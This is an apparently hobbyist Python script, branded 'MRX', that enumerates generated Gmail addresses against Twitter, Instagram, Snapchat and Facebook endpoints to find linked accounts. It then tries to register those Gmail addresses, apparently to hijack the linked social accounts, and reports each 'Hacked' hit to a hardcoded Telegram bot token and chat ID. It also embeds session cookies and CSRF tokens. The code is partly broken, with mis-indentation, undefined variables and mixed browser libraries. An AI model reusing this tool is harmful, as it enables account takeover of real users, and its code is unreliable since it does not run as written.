from selenium import webdriver
import unittest
from selenium import webdriver
from selenium.webdriver.common.keys import Keys
import requests,os,mechanize,random,driver
E = '\033[1;31m'
G = '\033[1;32m'
S = '\033[1;33m'
B = '\033[1;34m'
W = '\033[1;35m'
user='2'
uagent = [
'Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.1) Gecko/2008071615 Fedora/3.0.1-1.fc9 Firefox/3.0.1'
]
def code_whisper(self,ty,urw,mod):
    br = mechanize.Browser()
    br.set_handle_equiv(True)
    br.set_handle_redirect(True)
    br.set_handle_referer(True)
    br.set_handle_robots(False)

    br.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(), max_time=1)
    br.addheaders = [('User-agent', 'Mozila')]
    login = 'https://accounts.google.com/signup/v2/webcreateaccount?service=mail&continue=https%3A%2F%2Fmail.google.com%2Fmail%2F&dsh=S-1408489773%3A1633286410927920&biz=false&hl=en&flowName=GlifWebSignIn&flowEntry=SignUp'
    br.open(login)
    br.select_form(nr=0)
    
    

    #driver.geturl('https://accounts.google.com/signup/v2/webcreateaccount?service=mail&continue=https%3A%2F%2Fmail.google.com%2Fmail%2F&dsh=S-1408489773%3A1633286410927920&biz=false&hl=en&flowName=GlifWebSignIn&flowEntry=SignUp')
   # x = br.find_element_by_xpath("aria-invalid")
   elem = br.find_element_by_xpath('H2SoFe LZgQXe RELBvb TFhTPc')

    br.form['firstName']='ahmed'
    br.form['lastName']='ahmed'
    br.form['Username'] = self.email
    br.form['Passwd']='ahmed123@@'
    br.form['ConfirmPasswd']='ahmed123@@'
    sub = br.submit()
    urlY = sub.geturl()
    if urlY != login :
        mra = f"""
{ty}
 ︎.ꨄ︎ ––––––––––––––––︎ ꨄ︎. 
 .✉. 𝐞𝐦𝐚𝐢𝐥 : {self.email}
 
 .︎ꨄ︎ –––––––––––––––– ꨄ︎.
Tele ==> @T_Y_V
        """
        #noor.noor.noor.noornoore
        print(f"{G} Hacked {mod} and gmail ==> "+G+self.email)
        tlg =requests.post(f'https://api.telegram.org/bot{tok}/sendMessage?chat_id={ID}&text= \n {mra}')
        print(G+mra)
        #with open('gmail.txt', 'a') as (HACKED):
                        #HACKED.write('\n'+self.email  )
        pass
    else:

        print(S+" Not Hacked gmail => "+self.email)
        
class ChecK():
#  while True:
    def __init__(self):
      i=0
      while True:
#        self.email = str(input("Enter Email: "))
#        name=input('[+] Give Me Name To Hack ==> ')
        whisper = str("".join(random.choice(user)for i in range(rng)))
        self.email = (name+whisper+"@gmail.com")
        if '1001' in self.email:
        	exit()
        self.twitter()

    def PrintTT(self):
        print(f"{G}Twitter = {self.email} = Linked")
    def PrintFT(self):
        print(f"{E}Twitter = {self.email} = Unlinked")
    def PrintTI(self):
        print(f"{G}InstaGram = {self.email} = Linked")

    def PrintFI(self):
        print(f"{E}InstaGram = {self.email} = Unlinked")
    def PrintTS(self):
        print(f"{G}SnapChat = {self.email} = Linked")

    def PrintFS(self):
        print(f"{E}SnapChat = {self.email} = Unlinked")
    def PrintTF(self):
        print(f"{G}FaceBook = {self.email} = Linked")
    def PrintFF(self):
        print(f"{E}FaceBook = {self.email} = Unlinked")

    def twitter(self):
#        print(f"{S}==================")
#        print("[+] Twitter [+]")
#        print("")
        mod='SnapChat'
        ty='.🐦. Twitter .🐦.'
        urw='https://mobile.twitter.com/i/flow/password_reset'
        r = requests.Session()
        url = "https://api.twitter.com/i/users/email_available.json?email="+self.email
        user_agent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.182 Safari/537.36"
        Host = "api.twitter.com"
        Accept = "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9"
        r.headers = {'User-Agent': user_agent}
        r.headers = {'Host': Host}
        r.headers = {'Accept': Accept}
        req = r.get(url).json()
        text = str(req)
        #print(text)
        if text.find("'valid': False") == True:
            self.PrintTT() 
            code_whisper(self,ty,urw,mod)
        else:
            self.PrintFT()
        self.instagram()

    def instagram(self):
#        print(f"{S}==================")
#        print("[+] Instagram [+]")
#        print("")
        mod='InstaGram'
        ty='.📷. InstaGram .📷.'
        urw='https://www.instagram.com/accounts/password/reset/'
        usA = ['Mozilla/5.0 (Linux; Android 5.1; PGN518) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.101 Mobile Safari/537.36','Opera/9.80 (Android; Opera Mini/32.0.2254/85. U; id) Presto/2.12.423 Version/12.16','Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36','Mozilla/5.0 (Linux; Android 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.120 Mobile Safari/537.36','Mozilla/5.0 (Linux; Android 5.0; PGN511 Build/LRX21M) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.93 Mobile Safari/537.36']
        user_agint = random.choice(usA)
        url = 'https://www.instagram.com/accounts/web_create_ajax/attempt/'
        heade_ruks={
                'accept': '*/*',
                'accept-encoding': 'gzip, deflate, br',
                'accept-language': 'ar,en-US;q=0.9,en;q=0.8,ar-SA;q=0.7',
                'content-length': '61',
                'content-type': 'application/x-www-form-urlencoded',
                'cookie': 'ig_cb=2; ig_did=BB52B198-B05A-424E-BA07-B15F3D4C3893; mid=YAlcaQALAAHzmX6nvD8dWMRVYFCO; shbid=15012; rur=PRN; shbts=1612894029.7666144; csrftoken=CPKow8myeXW9AuB3Lny0wNxx0EzoDQoI',
                'origin': 'https://www.instagram.com',
                'referer': 'https://www.instagram.com/accounts/emailsignup/',
                'sec-ch-ua': '"Google Chrome";v="87", " Not;A Brand";v="99", "Chromium";v="87"',
                'sec-ch-ua-mobile': '?0',
                'sec-fetch-dest': 'empty',
                'sec-fetch-mode': 'cors',
                'sec-fetch-site': 'same-origin',
                    'user-agent': user_agint,
                'x-csrftoken': 'CPKow8myeXW9AuB3Lny0wNxx0EzoDQoI',
                'x-ig-app-id': '936619743392459',
                'x-ig-www-claim': 'hmac.AR0Plwj5om112fwzrrYnMNjMLPnyWfFFq1tG7MCcMv5_vN9M',
                'x-instagram-ajax': '72bda6b1d047',
                'x-requested-with': 'XMLHttpRequest'
            } 
        data_ruks={
                'email' : f'{self.email}',
                'username': f'{self.email}',
                'first_name': 'AA',
                'opt_into_one_tap': 'false'
            }
        da = requests.post(url,headers=heade_ruks,data=data_ruks).text
        if 'email_is_taken' in da:
            self.PrintTI()
            code_whisper(self,ty,urw,mod)
        else:
            self.PrintFI()
        self.snacphat()

    def snacphat(self): 
#        print(f"{S}==================")
#        print("[+] Snapchat [+]")
        mod='SnapChat'
        ty='.👻. SnapChat .👻.'
        urw='https://accounts.snapchat.com/accounts/password_reset_request'
        r = requests.Session()
        url = "https://accounts.snapchat.com/accounts/merlin/login"
        r.headers = {
        'Host': 'accounts.snapchat.com',
        'Accept': 'application/json, text/plain, */*',
        'Accept-Encoding': 'gzip, deflate, br',
        'X-XSRF-TOKEN': 'missing',
        'Content-Type': 'application/json',
        'Origin': 'https://accounts.snapchat.com',
        'User-Agent': 'Mozilla/5.0 (iPhone; CPU iPhone OS 13_1_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148',
        'Connection':'keep-alive',
        'Referer': 'https://accounts.snapchat.com/accounts/merlin/login'
        }
        cookies = {
        'xsrf_token':'missing'
        }
        data = {
        'email':self.email,
        'app':'BITMOJI_APP'
        }
        req = r.post(url, cookies=cookies, json=data)
        #print(req.text) # If the response is blank, it means Unlinked .
        if req.text.find("hasSnapchat") >= 0 :
            self.PrintTS()
            code_whisper(self,ty,urw,mod)
        else:
            self.PrintFS()
            self.facebook()
    def facebook(self):
                    ty='.📟. FaceBook .📟.'
                    urw='https://m.facebook.com/login/identify/'
                    mod='FaceBook'
                    br = mechanize.Browser()
                    br.set_handle_robots(False)
                    br.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(), max_time=1)
                    br.addheaders = [('User-agent', random.choice(uagent))]
                    br.open("https://mbasic.facebook.com/login/identify/?ctx=recover&search_attempts=0&ars=facebook_login&alternate_search=0&toggle_search_mode=1")
                    br._factory.is_html= True
                    br.select_form(nr=0)
                    br.form["email"] = self.email
                    br.submit()
                    urb = br.geturl()
                    #print(urb)
                    if "https://mbasic.facebook.com/login/identify/?ctx=recover&search_attempts=1&ars=facebook_login&alternate_search=1" in urb:
                        self.PrintFF()
                    if "https://mbasic.facebook.com/login/identify/?ctx=recover&c=%2Flogin%2F&search_attempts=1&ars=facebook_login&alternate_search=1&show_friend_search_filtered_list=0&birth_month_search=0&city_search=0" in urb:
                        self.PrintFF()
                        pass
                    else:
                        self.PrintTF()
                        #print(urb)
                        code_whisper(self,ty,urw,mod)

if __name__ == "__main__":
    os.system('clear')
    print(B+"""

             [-] M  R  X [-]
     [ Twitter - Instagram - Snapchat - Facebook ]
        ======================================= 
        | [+] Programming By : MRX        |
        | [+] Telegram : @T_Y_V           |
        | 
        =======================================

        """)
    
    ID='69726759'
    tok='1929429585:AAHHnHDba5mWqq0KU5lAGiaQs1f3PU9mKOw'
    name='noor.noor.noor.noornoore'
    rng='1'
    rng=int(rng)
    ChecK()


#print('')    
#print(S+'Press enter to exit .')
#input('')